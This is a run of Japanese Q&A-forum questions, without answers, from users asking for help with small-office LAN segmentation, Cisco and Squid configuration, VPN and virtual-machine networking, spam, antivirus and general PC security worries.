小さな事業所のＬＡＮ構成について教えてください。 現在、ＮＴＴ光を使って、ＯＮＵ→ＣＴＵ→ＨＵＢという簡単な構成にしていますが、別の部屋を借りる事になり、セキュリティの関係で別セグメント構成にしたいと考えています。 また、セグメントで分けた別部屋に設置予定のＮＡＳ（ディスク）へのアクセス出来るようにしたいと考えています。　簡単なイメージはこの通りです。 この様なイメージで、セグメントを分けて無線ＬＡＮを使用し、今の部屋から別部屋のＮＡＳへはアクセスしたいと考えています。 　ＯＮＵ　→　ＣＴＵ　→　Ｌ２スイッチ　→　今の部屋のＨＵＢ　→　無線ＬＡＮ（ルータ）　→　各ＰＣ 　　　　　　　　　　　　　　　　↓　　　　　　　　　　　　↓　　　　　　　　　　 　　　　　　　　　　　　　　　　↓　　　　　　　　　　　　→　　有線ＬＡＮ　→　プリンタ 　　　　　　　　　　　　　　　　↓ 　　　　　　　　　　　　　　　　↓　→　　→　無線ＬＡＮ（ルータ）　→　各ＰＣ（別の部屋で使用） 質問１ 　　ＣＴＵにＬ２スイッチをつないでＶＬＡＮ構成にしたいと思います。　そのＶＬＡＮで別セグメントに 　　ＨＵＢ　や無線ルータをつなぎたいと思いますが、問題はあるでしょうか。 以上、よろしくお願いします。 　
会社のLANでつながれた、サーバ上のフォルダを、各自支給されたパソコンから、その人に知られず、任意に見せたり、存在すら隠して見えなかったりすることが、できますでしょうか？ 　　　 （サーバー上のフォルダーに悪口を書かれて困っています。誰かは想像がつきますが、証拠がなく、また心の病の人なので、事を荒立てたくありません。他の人からは見られないように特定のフォルダの存在を隠し、その犯人だけが読み書きできるような設定を、誰にも知られずにしたいと考えています）
フリーソフトや無線LANでAES採用されてるものが多くありますがAES暗号には致命的な脆弱性はいまだ発見されず、総当りでも解読できないようです。何故アメリカはこんなものを公開して誰でも使えるようにしてるんでしょうか。米国にとって何の利益があるんでしょうか。wikipediaを読みましたが肝心なところが書かれてませんでした。
アダルト無料動画サイトは悪質が多いとよく聞くので今まで見なかったのですが無料で見れるなら…と見てしまいました。 アダルト動画が実際無料で見れるはずないのは承知だったんですが、サイト行き動画再生したら普通に見ることができました。 ワンクリックの「登録完了しました」やダウンロード画面なども出てません。 ですが「規約に同意」はなかったと思いますが、「18才以上ですか?」に「はい」は押しました。 これは本当に無料で大丈夫ということなんでしょうか。 心配なので質問しました。回答お願いします
使用している自分のパソコンはノートパソコンのWindows7です。あまりパソコンに詳しくありません。 私は仕事に行っていて朝6時頃から夜の9時頃まで帰ってこれないのですが、その間に同居している姉にパソコンをいじられてしまうので困っています。 アカウントは私の分しかあらず、ロックもかけているのに帰ってきたらロックが外されていたり、ゲストアカウントが作られていたりします。何度パスワードを変えても無駄なようで、どうしてこんなことができるのか不思議です。 姉は昔におかしなサイトを開いてパソコンをウイルスに感染させたり、勝手にフォルダやメールを見たり消したりするのでどうにかしてロックを強化したいのです・・・方法を教えてください！ できれば私はネットゲームをしていて、スリープモードや休止モードにせずに、つけたまま（スリープ等にしてしまうとゲームが作動しなくなるため）にしておきたいのですが、その状態でパソコンを操作できないようにすることは可能でしょうか。ノートパソコンは閉じた状態にしておきたいです。この間ゲームをつけたままにしてロックを掛けておいたら、リアルマネーを数万ほど勝手に使われたことがあり、加減を知らない姉にほとほと困り果てています。何度やめてくれと言ってもしらを切ってきます・・・お願いします。
Windows7パソコンでのtelnet接続について教えてください。 異なるセグメント間ではtelnetはできないのでしょうか。 10.4.xxx.xxx　から　10.6.xxx.xxx　に接続しようとしています。 telnetを実行したのですが、下記メッセージが表示されてしまいました。 「ポート番号　23：接続に失敗しました。」 パソコン側では下記の設定をしています。 Windows の機能の有効化または無効化で「Telnetクライアント」と「Telnetサーバー」をチェック Windowsファイアウォールによるプログラムの許可で「Telnet」をチェック サービス一覧で「Telnet」を開始 以上よろしくお願いします。
中国やロシアのグレートファイアーウォールを回避したり、破ったりという、IT技術を日本は持っているのですか？ハッカー集団アノニマスならできますか？中国やロシアのインターネット上の情報統制を破ることはできますか？
CISCO3560におけるルーティングの設定で質問させて下さい。 特定の送信元から送られてきた通信だけ、特定の機器に飛ぶようにルーティングを設定する方法を教えて下さい。 Cisco3560は既にospfで回っており、例えば、10.200.0.0/16宛の通信の通常時のネクストホップは決まっている。 この状態で、Cisco3560に、送信元10.100.2.2から届いた通信だけ 10.100.1.1へ飛ぶようにstaticで経路を切るにはどうすればいいでしょうか？ また、同じCISCOであれば、ルーターとスイッチで設定すべきconfigは同じでしょうか？？ （バージョンによる違いはあるかもしれませんが、基本的に同じなのでしょうか？）
こちらに投稿されていた同じ症状で困っています。 セキュリティアップデート 2011-004 (Snow Leopard) をしたところ、次にMailを開こうとすると＜このバージョンのMailは、このバージョンのMac OS xでは使用出来ません,次の場所にあるMailバージョン4.5（1084／1085）を開こうとしました・・・＞とアラートが出ました。それまで異常なく使っていたのですが。　という同じ症状がありまして。。 そこで、こちらでの回答を拝見し、試してみましたが。。 「セキュリティアップデート 2011-004 (Snow Leopard)をダウンロード、SecUpd2012-004.dmgをマウントしSetUpd2012-004.pkgをを開いてアップデートをやり直します。 Mail4.5がアプリケーション・フォルダにある事を確認し、終了しておいて下さい。アプリケーション・フォルダ内に4.5とは別に4.6が作られているときは4.6をゴミ箱に捨ててて下さい。再起動後Mail4.6が使用出来ます。」 を何度も試してみましたが、変わりませんでした。 行ったのは、セキュリティアップデート 2011-004 (Snow Leopard)をダウンロードした後、アプリケーション・フォルダ内には4.5と4.6が作られていますので、4.6をゴミ箱に捨て、4.5だけにしてから、再起動しました。 こちらの方法で解決しない場合、何をしたら良いのか分かりません。再度、メールアプリ？をダウンロードしたらよいのか、ただ、今までのメールの履歴なども消えてしまうのかなど も分からず、困っております。 詳しくないため何か操作が違うのかもしれませんが、どうぞ宜しくお願いします。
Webメール（Webメールサイト）の脆弱性について質問です。 会社から、脆弱性が指摘されている外部Webメールサービスのアドレスへメールを送信したとします。 以下のような条件で、且つ受信側でメールの操作を行った場合、 会社側のサーバー等が何らかの攻撃をされたり、その他の危険に晒されることはあるのでしょうか。 ・送信したメーラーに脆弱性などはないとします ・メールはテキスト形式。メーラーの仕様によりHTML形式のファイルが添付されることがある ・会社側からWebメールのサイトにはアクセスしていない ・受信側でメールを開いた ・添付ファイルは開かない ・メール本文および当然ですがヘッダーには、メールアドレスや経路情報の記述がある
squid3をクラウドサーバに実装しています。以下の場合、Aルータには検索履歴が残るのでしょうか。 PC -> プロキシ -> Aルータ(デフォルトゲートウェイサーバ) -> クラウドサーバ -> ネット！ 信用出来ない環境の場合、ログ等を見られたくないのです。
たまに掲示板などで1年前や5年前に投稿した人のIPアドレスが公開されています。 こういう情報から個人を特定できるんでしょうか？ 私の理解ですが、IPアドレスがわかればどのプロバイダからアクセスしたか、わかると思います。 普通はIPアドレス、プロバイダのログ、契約者情報をつき合わせて個人を特定するのだと思います。 しかし、1年前や5年前のログ等が残っているところはほとんどないと思います。 個人特定できなさそうな感じがしますが、実際は警察とかが要請すれば個人特定できるんですか？
ウイルスバスター2010年3年更新版をWindows8へインストールしようと思い実行しましたが 互換性が無い為にスタートする事が出来ません。 修正プログラム等はあるのでしょうか？
無線ルータのMACアドレスの調べ方を教えてください。 型番はWHR-G301Nです。 マルチSSIDではそのそれぞれが個別のMACアドレスを持つと聞きました。 この機器については知りませんが、そうであるならそれらすべてを調べたいです。 いまの私の環境ではSSIDは２つあり、 ○○○○○○○○○○○○ ○○○○○○○○○○○○－１ となっています。 一応、そのルータと有線で繋がったPCはあります。 宜しくお願い致します。
123.456.0.0～123.456.255.255 までの範囲のIPアドレスを許可したいのですが どのように設定すればよいかわかりません。 現在の設定は以下のようになっています。 acl hoge 123.456.0.0/255.255.255.255 http_access allow hoge OSは [root@vps squid]# cat /etc/redhat-release CentOS release 5.4 (Final)
お世話になっております。 当方、ひとつのホスト上でのゲストOS同士の通信を実現させたいのですが うまくいきません。 以下に詳細を記載します。 ■環境 　ホストOS：WindowsXP 　ゲストOS１：ESXi5.0 　ゲストOS２：ESXi5.0 ■アドレス 　ホスト：192.168.11.130/24 　ゲスト１：192.168.11.150/24（ホスト上の仮想OS） 　ゲスト２：192.168.11.151/24（ホスト上の仮想OS） ■ツール 　ゲストはVMware Player同士 と VMware workstation同士 両パターンでためしましたが 　ゲスト同士で通信はできません（通信試験結果なども全く一緒です） ■ネットワーク接続のタイプ 　ブリッジ、NAT、ホストオンリーそれぞれ全部試しましたがゲストOS同士の通信はできません ■通信試験 　ホスト⇔ゲスト１　OK 　ホスト⇔ゲスト２　OK 　ホスト⇔ゲートウェイ　OK 　ゲスト１⇔ゲートウェイ　OK　（ホストオンリー以外） 　ゲスト２⇔ゲートウェイ　OK　（ホストオンリー以外） 　ゲスト１⇔ゲスト２　NG　（ブリッジ、NAT、ホストオンリー全て） 仕様的に単一ホスト内でのゲスト通信はできないものでしょうか？ また、出来る場合設定などを教えていただけると大変助かります。 以上、宜しくお願いします。 　
SSLによる暗号化をせずにメール送信(SMTP)する場合、 そのSMTPサーバーがSMTP認証を必要とする場合、 アカウントとパスワードを送信するわけですが、 これを第3者に傍受された場合、そのアカウントと パスワードは簡単に盗まれてしまいますか？
無線LANについての質問です。 無線LANのアクセスポイントの受信強度の指標として、RSSIというものが存在します。この数値は、アクセスポイントのどの信号の強度を示しているのでしょうか。 受信したビーコンの、出力を変換しているのかなとは思っているのですが、ステルス機能を使った場合、RSSIが分からなくなる気がします。 また、同じチャネルにAPが複数存在する場合、inSSIDerといったRSSI監視ソフトを用いると、強度が数秒単位で大きくばらつくことがあるのですが、これは、CSMA/CAにより、APがビーコンの出力を弱めているという理解で良いのでしょうか。 質問が２つになってしまいましたが、ご回答いただけると幸いです。
通信速度が500mbps(Bits Per Second)の場合、 30GByteのファイルを転送するのに必要な時間を出したいと思います。 どういった計算をすれば算出できるでしょうか？。 お手数ですがアドバイスをお願いします。
近所のPC初心者の方々にノートPC持参してもらい、簡単なPC利用講座みたいなのを開きたいと考えています。 そして、ウチの環境からインターネットに繋げるにあたり、それらノートPCを繋げるネットワークと、元からある自分のネットワークを切り離した上で、両ネットワークでインターネットできるようにしたいです。 現在は以下のような、ルータ以下に一つのネットワークがあり、DHCPでIPアドレスを割り振っています。 WAN │ ルータ(ネットワーク1) 　　├PC1 　　└PC2 これを、一時的に以下のようにしたいです。 WAN │ ルータ(ネットワーク1) 　├PC1 　├PC2 　└ネットワーク2 　　　├PC3 　　　└PC4 上図でなくとも、以下の条件を満たすのであれば構いません ・PC1,2とPC3,4は互いにアクセスできないようにしたい ・PC1～4はWAN側(インターネット)には繋げるようにしたい ・図中の「ルータ」の設定はなるべく変更したくない Nintendo DS用に、「WEP経由だとインターネットにはアクセスできるがLAN側にはアクセスさせない」みたいな機能が付いたルータをよく見かけますが、やりたいことの方向性はこれです。 この構成にするのは一時的なもので、かつ定期的に利用する予定です。 なので、どこかに別ルータかPC等を配置し、必要ないときはその機器を取り外すとネットワーク2が消える、という形にしたいです。 ネットワークの事はよくわからないのですが、イメージ的には ・前述の図のように元のネットワークに新ルータを置き、そこにネットワーク2へ入れたいPCをぶら下げる ・新ルータの設定で、ネットワーク2からネットワーク1のPCにアクセスできないように設定（具体的にどうするのかはわかりませんが） のような形なのかなと思っています。 できればお金をかけたくない(数千円程度なら構わない)のですが、何か方法はあるでしょうか？ 利用できそうなデバイスとしては ・BBR-4HG（バッファローの有線ルータ) ・古いXPのノートパソコン があります。
一日に何度も来る迷惑メールがあるのですが、どうしても削除できません。 正確に言うと一旦は削除できるのですが、Outlookを落として立ち上げ直すと、また入ってきてしまいます。 Outlookを起動するたびに迷惑メールフォルダを空にし直す作業を強いられてしまうのですが、何か根絶させる方法はないでしょうか？ ちなみに、このメールの発信元は私のアドレスになっています。
C++で、あるファイルを暗号化するプログラムを作成しようと思っています。 暗号はRSAで、と思っていますが、どのようにすればいいのか分かりません。 暗号自体のアルゴリズムは理解しているのですが、 「具体的に」どうすればいいのか教えて欲しいのです。 「文字」とか、そういう単位がなくて、単なるディスクファイル、またはメモリ上の bit列があったときに、それをどうやって暗号化するか、また復号するか。 鍵が分かったとして、bit列のどこからどこまでを1つの単位として計算するのか。 その暗号化単位は、公開鍵だけで判断できるのか。 素数で割った余りなので、1つの数字としてみたときに素数より小さい数でないと だめなことは分かります。 もしかしたら、このようなデータの暗号化は、他のアルゴリズムを 使用した方がいいのかもしれませんが、暗号について あまり詳しくないので、どうしたらいいのか分かりません。 ネットで調べた内容では、アルゴリズムは理解できても、 対象としているデータで、実際どうやるのか分かりませんでした。 よろしくお願いします。
会社のＰＣで社内システム利用時に、セキュリティソフトのメッセージで 「不正アクセスが検知されました。」 「ファイアウォール違反またはネットワークウイルスが検出されました。または、大規模感染が発生しています。」 と表示がありました。 ＯＳ：ウィンドウズＸＰ セキュリティソフト：ウィルスバスター 会社ＰＣ使用状況：社内共有ファイルのエクセルファイルと複数の社内システムを起動。 その日、他のウェブサイトの利用はありませんでした。また、その日ＵＳＢ使用はまだなく、使用時はセキュリティソフトの検索をします。 社内システムの１つを動かしているときに、ありえないくらいのウィンドウが出てきてフリーズしてしまいました。 タスクマネージャーを使用し、ウィンドウを消していくと一番最後にセキュリティソフトのメッセージが表示されたウィンドウがありました。 セキュリティソフトのログには何も表示がなく、再度手動検索を行いましたが何も検出されませんでした。 こういう場合、原因は何が考えられますか？ 会社のシステム関係の部署に聞きましたが、原因が分からず気持ちが悪いです。 可能性としては、複数のシステムを起動していたからということらしいのですが、ここ１カ月は同じような使用状況でした。 ただ、起動している複数のシステムを２つ動かすとフリーズすることはありました。 なので、動かす時は、起動しているシステムを一つだけしか動かしていません。 どうかよろしくお願いします。
192.168.1.***/24と192.168.2.***/24　というネットワークがあり、（以下192．168は省きます） 1.***のネットワーク内のPCから2.***のネットワーク内のPCへアクセスしたい場合、 CISCOのルータで設定可能ですか？それか、CISCOのスイッチでも可能ですか？ もし、設定すれば可能だった場合、 必要機器に付いているLAN口分異なるネットワークへの接続及び設定が可能ということでしょうか。 よろしくお願い致します。
110番ポートが常に海外からの辞書攻撃にさらされているのですが、対応方法はどのようなものがよいでしょうか？ 宜しくお願いします。
表題のとおりです。 pingで繫がってることを確認できますが リモート接続が出来ません。 （ホスト側） Windows Vista IP:192.168.0.2 （ゲスト側） OS:CentOS　6 IP:192.168.4.1 Mask:255.255.255.0 NAT使用 ゲスト側のIPアドレスは、手動でホスト側の VMware Network Adapter VMnet8と同じにしてます。 どこを確認すればよいのかが 分からないのでご教授をお願いします。
PCを立ち上げると毎回、画面の右下に、「主婦ウフウフフ」と書いた画像が出ます、たぶんアダルト系のだと思うのですか、これってウイルスなのでしょうか、 あまりPCに精通してませんので、恐くてアダルトサイトには行った事がありません、 PCの使用はインターネットとメール、Gyaoを見る位です、メールには時々アダルト系の迷惑メールが届きますが開いた事はありません、 この画像を消すにはPCを初期化しないと駄目なのでしようか、他に良い方法があれば教えて下さい、 PC・Windows7 I　E・8 ※ウイルスバスター　クラウドが入っています
pingで大量の機器に対して導通確認を行うバッチプログラム があるのですが、その検証用に「複数のpingに答える機器」 を用意できないかと考えています。どなたかお知恵拝借頂け ないでしょうか？
Vaio VGN-CS61Bを使っています。 実家ではバッファロー製のWI-FIに簡単に接続できます。 一人暮らしの方の家でも同じものを買いましたが、 接続できたりできなかったりです。 できても1日パソコンをつけっぱなしにしていると勝手に接続します。 iPad, MacBook Airや他のSONY製品はつながっています。 何に問題があるのでしょうか？ 回答よろしくお願いします。
rootではなく追加したユーザで作業を行っていきたいのですがwheelに変更してもrootと同じ操作が出来ませんでした。 確認の仕方が適切かどうかわからず質問させていただきました。 さくらのVPSでドットインストールのサイトを参考に追加したユーザをwheelグループに変更しました。 visudo で %wheel の手前にあったコメントもはずしています。 これでroot権限と同じになったはずだと思って追加したユーザでログインして # visudo と入力してみたんですけど権限がないとはじかれました。 # id test　（test が追加したユーザ名） uid=506(test) gid=506(test) 所属グループ=506(test),10(wheel) 所属グループにwheelがあるので権限あるんじゃないかと思うのですが 確認の仕方が問題なのか設定が問題なのか調べてもわからずにつまってしまいました。
＊PCについてですが、初心者なので説明が分かり難いところがあるかもしれません。 ポップアップウインドウは小窓で広告等が出てくるものだと思っています。 最近、Atokの更新とiTunesをインストールしました。その後、yahooや楽天オークション、mixiの一部に左右どちらかの下から小窓で宣伝が出てきます。とても邪魔です。悪意のないものなのでポップアップウインドウブロックには引っかからないのかな？と思いますが、高レベルでブロックしています。 このおかげで、gmailなどリンクできるアドレスを押しても、ポップアップウインドウブロックしているので開けません。と言う表示が出ます。 1.ポップアップウインドウとサイトリンクの意味をはき違えているのでしょうか？私的には、逆なのではないかと思いますが？ 2.悪意のないポップアップウインドウ(広告用）を出させないようにすることはできますか？サイト開いとゆっくりヌーッと出てくるので、読んでいるところを隠されていらいらします。 ツールバーを変えてみたりしましたが、同じ状態なので質問をさせていただきました。
突然Internet Explorer を起動するたびに「セキュリティー証明書にエラーのあるコンテンツの表示がInternet Explorer によりブロックされました」と表示バーが立ち上がります。 何が原因でしょうか？改善方法教えてください。 Internet Explorer はバージョン９．０．１です。よろしくお願いいたします。
以下の設定の場合、通信できないと認識していたのですが、通信できてるのはなぜしょうか？ ＜ローカル内LAN＞ <全て仮IPです。> 端末A：10.1.x.x サブネット：255.255.255.0　 DNS ：10.6.x.x 端末B：10.6.x.x 上記のサブネットの場合、第4オクテットの変更同士でしか通信できないと思うのですが、 違うのでしょうか？
AVIRAとKINGSOFT　どちらも無料版ですけど、併用する事はいい事でしょうか、良くないのでしょうか。初めたばかりの初心者です。よろしくお願い
いろいろな会社がユーザーのデータをクラウドで無料で預かる業務をしています。 (1)膨大なデータ量になると思うのですが、一社あたり、空間的にどの程度のスペースを確保しているのでしょうか。 (2)万が一のクラッシュに供えてバックアップなどを別のエリアに保管しているのでしょうか。 よろしくお願いいたします。
ネットワーク関連について、質問したく投稿しました。 Ｌ２のスイッチを２台用意し、１つのサーバー（ＰＣ）からそれぞれのスイッチに１本ずつのＬＡＮケーブルを接続し、冗長構成をとりたく考えております。（Ｌ２の上位にルーターがございます） Ｌ２スイッチの１台ををアクティブ（通常使用）し、故障時はもう1台をしようという形にしたいのですが、 一般的にはどのようにするのでしょうか（どちらの機器側から、何か特別なソフトは必要でしょうか） 情報ございましたら、お願い致します。
全くの初心者で用語もよく分かりません。 コントロールパネルにjava6というのがありますが,javaとは何でしょうか。無ければならないのでしょうか。アンインストールするとどうなりますか。宜しくお願いします
httpsのhttpリクエストを何かツールで捕まえて、書き換えて送信することは出来ますか？ ネットショップの出品作業をしているのですが、毎回毎回同じ内容を入力するところを、 面倒なので、どうにかして一定の値がデフォルトで入力されているようにしたいのですが、 出来ないでしょうか？
レンタルで専用サーバーを借りています。 ドメインを取得していて、受信メールはそのレンタルサーバーのメールサーバーを使っています。 そのドメインでのメール送信サーバーは私の自宅のネット接続用のＮＴＴ西日本系のブロバイダの送信サーバーを使っています。 メーラーはシュリケンです。 その場合、レンタルサーバーを管理している会社の担当の技術者は、受信メールは違法的に閲覧できてしまうと思いますが、送信メールは閲覧出来てしまうんでしょうか？ また、その技術者は、私のブロバイダの送信メール用のパスワードを盗むことはできるでしょうか？ そのあたりを教えてください。 なんとなくその会社（個人経営）の担当者は危ない気がしてしかたありません。 （私しか知りえない内容のことを連絡用のメールの中に入れてきたので…） 私の気にし過ぎならよいのですが、そのあたりのところに情報漏洩があると嫌だなと思って質問させていただきました。 よろしくお願い致します。
iptablesで3306を開放していないのにポートが開放されてしまいます。 tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 閉鎖する方法はありますでしょうか。それとも仕様でしょうか。 ご存知の方、宜しくお願いします。
最近我が家のパソコンに「ご使用中のパソコンは危険な状態です！」 というメッセージが送信されわが社の保護製品を購入してください とのことですが本当に危険な状態かどうか確認する方法が あったら教えてください。
SSL　で通信経路を暗号化すれば安全だと宣伝しているのをYahooメールなどで見かけますが、 実際のニュースなどでは、 IDとパスワードの漏洩などがあり、通信経路よりもプロバイダーのメールボックスの中のほうが 攻撃を受けやすいのではないかと考えています。 国会議員のメールボックスが攻撃されたこともありました。 質問は、 １．LANの中での盗聴 ２．LANから外へ出てからの通信経路での盗聴 ３．メールボックスの中での盗聴 の3種類に分けて、 盗聴する場合の費用や難しさ 盗聴がばれる危険性など について教えていただきたいと思います。 たとえば、昔あった海底ケーブルの脇に潜水艦で盗聴装置を仕掛けたときの費用とか。。。 具体的な盗聴方法は、抽象的でも、答えていただかなくても結構です。 よろしくお願いします。
NATについて教えてください。 以下のような多段NATです。 PC-A → Router A → Router B → Router C → PC-B 通常ルーティングの設定が必要なRouterに、代わりに(静的)NATを使用すると、 PC-AとPC-Bとの通信が可能になりますでしょうか？
現在WiresharkのFlow Graphという機能を使用して、クライアント端末がサーバー端末へのTCP通信での3ウェイハンドシェイクのパケットやりとりを観測したいと思っています。 次のようなパケットをモニターしました。 |Time | 192.168.1.111 | | | | 192.168.1.222 | |6.402 | PSH, ACK - Len: 1212 |Seq = 1 Ack = 1 | |(6057) ------------------> (5000) | |6.606 | PSH, ACK - Len: 1212 |Seq = 1 Ack = 1 | |(6057) ------------------> (5000) | |6.835 | PSH, ACK - Len: 1212 |Seq = 1 Ack = 1213 | |(6057) <------------------ (5000) | |7.039 | ACK | |Seq = 1213 Ack = 1213 | |(6057) ------------------> (5000) | |7.150 | ACK | |Seq = 1213 Ack = 1213 このパケットのやりとりを観ていて思ったのですが、TCP通信は3ウェイハンドシェイクは SYN--->SYN ACK---> ACK という順序でのパケットのやりとりをクライアントとサーバー間で行うと思っていたのですが、 PSH, ACK ----> PSH, ACK ----> ACK ----> ACK このような順序になっているように思うのですが、これはなぜなのかご教授頂けないでしょうか? どうぞ、よろしくお願い致します。
10月9日にRegClenProの製品を　クレジットで購入したのですが 何の効果もみられず　、、、　クレジットの番号も知られていますので 勝手に引き出されないか　しんぱいです
私がOKWAVEで漫画家の赤松 健を叩いてから、突然OKWAVEのパスワードが改ざんされました。それはパスワード変更手続きですぐに解消出来たのですが、最近、OKWAVEだけが、ページダウンロード時に、高い確率でフリーズするようになりました。 まさか、ハッキングでやられているのでしょうか？ ますます、赤松健の精神性が明らかになる訳ですが、このフリーズを解消するにはどうしたらいいでしょうか？ また、ハッカーが居るとして、どうやってハッカーを突き止め、警察へ突き出せば良いでしょうか？
Windows XP Home Edition　のノートパソコンを使用しています。 『Soft ware Distribution Service 3.0』が自動更新でインストールされてから一部のソフトで不具合が発生しています。『コンピューターの変更をシステムの復元で戻す』でインストールされた以前に戻そうとしましたが復元出来ませんでした。今までだと、不具合が発生したソフトをアンインストール後再インストールすれば良かったのですが、それもだめです。ソフトのアンインストールを行ってもインストール時の情報が一部システムに残っているようです。(再インストール時製品シリアル番号が自動的に表示される様になりました)『Soft ware Distribution Service 3.0』をアンインストールする方法を教えてください。デスクトップパソコンは『Soft ware Distribution Service 3.0』がインストールされても今のところ問題はありません？
社内LANでWANとの境界に設置しているルーターをPPTPサーバにして社外からPPTP接続をしたいのですが、このときできることについてお伺いしたいのですが、 ・LAN側にあるファイルサーバーの共有ファイルへのアクセス ・LAN側クライアントPCにリモートデスクトップを行う 上記2点は可能なのでしょうか？ まだ、勉強中なのですが、基本的なところで教えてください。
いろいろなサイト（海外サイトも含めて）を閲覧しているとき、頻繁に表示されるテキスト広告（見た目では画像でありません）があります。 広告主は、私が住んでいる○○市のＷｅｂサイト制作会社の広告です。こんな地方の小さなＷｅｂサイト制作会社(ローカル）が、私がアクセスするページに異常に発生します。もちろん「教えて！goo」のこのサイト内でも私が質問したページを開くと、ちゃんと下にその広告が表示されます。 以前から気付いてはいましたが、行くさきざきのサイト内に無差別に出没するので、精神的にはストーカーのようにさえ感じてしまいます。私が同じ○○市に住んでいることを知っているかのような錯覚を覚えてしまいます。 もちろん、広告が表示されること自体、悪いことではないので不平不満を言うのは筋違いであることはわかっています。ＳＥＯ対策？が素晴らしいということなのかもしれません。 ここからが質問の本題ですが、 いつも同じサイトにアクセスしている訳ではないし、たまたま初めて閲覧した海外サイト内にまで表示されると状況となると、素人的には、自分がアクセスするところについてきているような気がしてしまいます。 そこでお聞きしたいのは、実際問題、そういうことはあるのでしょうか、というより可能なのでしょうか。
ipodtouchのネット接続できません。 ルーターはLAN-W300N/Rを使っています。 ipodtouchの左上には扇？のようなマークが出ているのに、ネットを接続することができません。 どうすればいいですか？ 調べてみても同じようなものばかりで、わからないです。 ・取説通りにやったので導入は大丈夫だと思います。 　壁～ルーター）））ipodtouchの状態です。 ・付属CDは何もしていません。 　PCで何かしないといけないのですか？ 　ipodtouch専用に接続したいと思っています。 誰か助けてください～～～((+_+))
プロキシ設定をするとインターネット接続が切れてしまいます。 プロキシ経由でサイトを見ようと思い、IEのインターネットオプションの接続→設定でプロキシサーバーを入力してOKを押し、設定を完了させたら、インターネットに接続できなくなります。 特定のプロキシサーバーだけでなくどれでやってもなりました。 また、プロキシ設定を解除したあとも、インターネットに接続出来ない状態が続きます。 どうしたらよいのでしょうか。。。
わからないので教えてください。 LAN内のクライアントには、DHCPで192.168.0.2～のプライベートIPを振るようになっているのですが、cmdでnetstat -nを実行すると192.168.1.×というIPが外部のhttpsにアクセスしているようです。 ただ、フリーの別コマンドでLAN内のIPを検索しても192.168.1.×なんてないんです。 これはどう解釈したらいいのでしょうか？
結論から言うと、Wi-Fiがつながらなくなりました。 以前までだと普通につかえていたのですが・・・ 　状況 　　・レオネットを使っている 　　・ルーターはauのHOME SPOT CUBE といった感じです。 レオネットはネットにつながった際に、ログイン(ユーザーIDとパスワード入力)をしないといけないのですが、そのログインする画面が出ることなく３G回線に戻ってしまいます。 10回ほどネットワークの設定を削除してみたり、初期化してもう一度本当の最初からネットワーク設定をしてみたりなど、調べつくした全ての方法を試してみたのですがどれもダメのようです。 やはりもうアップルの対応を待つしかないのでしょうか？ 学生の身なので出来るだけお金は使いたくないのですが・・・ 回答お待ちしております。足らない情報等ございましたら随時追記します。
このサイトのコンテンツ一覧→学問・教育→歴史にアクセスしたら、ウイルスに４こも感染しました。 Cookie_Advertiing Cookie_YielManag Cookie_Revsci Cookie_DoubieClick フレッツウイルスクリアで削除しましたが、今後このサイトに入るのが怖いです。 だれか解決してください。
社外からVPN接続してファイルサーバーにアクセスしたいのですがうまくいきません。 VPN接続はできているのですが、ネットワークにLAN内のサーバーやクライアントがでてきません。 以下構成等です。 ・VPNサーバーはルーターに構築。（PPTP　バッファローBHR-4GRV） ・ファイルサーバーは、Windowsserver2003RT ・ネットワークの簡単な構成は、モデム→ルーター→（Fortigate、サーバー、クライアント、複合機） ・セキュリティソフトはウイルスバスターコーポレートエディション ・ワークグループで運用しています。 ・VPN接続後ルーターの設定画面にはアクセスできます。 ・接続元はLAN内のIPアドレスがきちんと振られていました。 ・ファイルサーバーにpingはとびます。 ・LAN内の他のクライアントやファイルサーバーのネットワークには接続元のPCが表示されています。 ・fortigateを外してみても改善が見られません。 情報が足りなければ追加いたしますので、宜しくお願いします。
FONって何処で売っているんですか？ FONを買って登録したら、どこにでも、持ち運びができてwifiに接続できるのですか？ 教えてください！ お願いします！
Switch#vlan database Switch(vlan)#vlan 10 Switch#conf t Switch(config)#int fa0/1 Switch(config-if)#switchport access vlan 10 Switch(config-if)#end Switch#show running-config interface fa1/1 Building configuration... ! interface FastEthernet1/1 switchport access vlan 10 shutdown end Switch(config)#int fa0/1 Switch(config-if)#no switchport access vlan 11 Switch(config-if)#end Switch(config)#int fa0/1 Switch#show running-config interface fa1/1 Building configuration... ! interface FastEthernet1/1 shutdown end VLAN 10 を設定し、interface fa0/1にvlan10を割り付けたんですが、 割り付けたVLANを削除しようとして no switchport access vlan 10 ではなく switchport access vlan 11と打ち込んでみました。 するとshow running-config で確認すると int fa 0/1のswitchport access vlan 10が 削除されていました。 これは no switchport access vlan に続くVLAN番号が何であっても no switchport access vlan 10 と同じ設定効果があるということなのでしょうか？
PCをリカバリしたいと思っているのですが, リカバリ後に Norton Internet Security 2012 (以下NIS) を再インストールする際に プロダクトキーの他にNortonのアカウントなどを入力する必要はあったりするのでしょうか? NISはPC3台分まで使用可能なはずなので, 最初にNISがはいっていた他のPCからプロダクトキーをもらって, 自分のPCにインストールしました。 自分はアカウントを持っていないので 再インストールする際にアカウントの入力を求められたりしても, わからずインストール出来ません。 リカバリしてNISがインストール出来ない事態になったら嫌なので わかる方は早めに回答をよろしくお願いします。 本当にお願いします。
CENTOS6で、 /etc/resolv.conf -------------------------------- # Generated by NetworkManager nameserver 192.168.11.1 nameserver 127.0.0.1 -------------------------------- となっていますが、ローカルに設置したnamedを参照しないようです。 nameserver 192.168.11.1 を手動で削除すれば、正常にローカルのnamedを参照してくれます。 /etc/resolv.conf が起動時に生成されるさいに。 nameserver 192.168.11.1 が勝手に記述されます。(ifcfg_eth0での記述はDNS1=127.0.0.1　のみ) 解決法として、 ・/etc/resolv.conf 　の設定が　127.0.0.1　のみなる ・２つあるnameserverの両方を参照しにいくようにする のどちらかの方法をご教授ください。 お願いします。 ------ifcfg_eth0------------- DEVICE="eth0" BOOTPROTO="dhcp" HWADDR="08:00:27:C7:97:69" NM_CONTROLLED="yes" ONBOOT="yes" TYPE="Ethernet" UUID="1becd376-0fea-4dfc-a035-7fc037118343" DNS1=127.0.0.1 ------ifcfg_eth1-------------- DEVICE=eth1 BOOTPROTO=none ONBOOT=yes HWADDR=08:00:27:0A:DE:4B IPADDR=192.168.56.5 NETMASK=255.255.255.0 NETWORK=192.168.56.0 TYPE=Ethernet USERCTL=no IPV6INIT=no PEERDNS=yes DNS1=127.0.0.1 （←念のため）
